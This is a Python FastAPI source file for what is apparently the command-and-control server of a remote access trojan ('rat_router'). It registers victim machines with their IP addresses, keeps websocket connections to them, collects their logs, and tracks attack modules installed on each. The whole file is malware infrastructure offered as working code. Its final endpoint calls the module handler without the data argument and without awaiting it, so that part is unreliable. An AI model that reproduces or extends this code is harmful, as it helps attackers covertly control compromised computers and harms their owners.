from fastapi import WebSocket, APIRouter, Request, WebSocketDisconnect

import machines
import con
from uid import Uid, gen_uid
from modules.all import MODULES

rat_router = APIRouter()

@rat_router.get("/api/{version}/register")
async def register_machine(version: int, request: Request) -> Uid:
	id = gen_uid()
	machines.all[id] = machines.Machine(id=id, version=version)
	await machines.all[id].on_register(request.client.host)
	print("Registered: ", id)
	return id

@rat_router.websocket("/ws/{version}/{machine_id}")
async def machine_websocket_endpoint(websocket: WebSocket, version: int, machine_id: Uid):
	await websocket.accept()
	try:
		print(f"Machine {machine_id} connected")
		con.active_machines[machine_id] = websocket
		await machines.all[machine_id].on_connect(websocket.client.host)
		while True:
			data = await websocket.receive_json()
			match data["event"]:
				case "log":
					await con.broadcast_log(machine_id, data["data"] if "data" in data else None, data["tags"] if "tags" in data else None)
				case "module":
					await machines.all[machine_id].modules[data["module"]].handle_rat_message(data["data"])
				case "module_installed":
					machines.all[machine_id].modules[data["name"]] = MODULES[data["name"]](machine_id=machine_id)
					await con.broadcast_machine_update(machines.all[machine_id])
				case "module_uninstalled":
					del machines.all[machine_id].modules[data["name"]]
					await con.broadcast_machine_update(machines.all[machine_id])

	except WebSocketDisconnect:
		print(f"Machine {machine_id} left")
	finally:
		await machines.all[machine_id].on_disconnect(websocket.client.host)

for i in MODULES:
	if MODULES[i].router:
		rat_router.include_router(MODULES[i].router, prefix='/modules/'+i)

@rat_router.post("/api/{version}/modules/msg/{module_name}/{machine_id}")
async def message_module(version: int, module_name: str, machine_id: Uid):
	machines.all[machine_id].modules[module_name].handle_rat_message()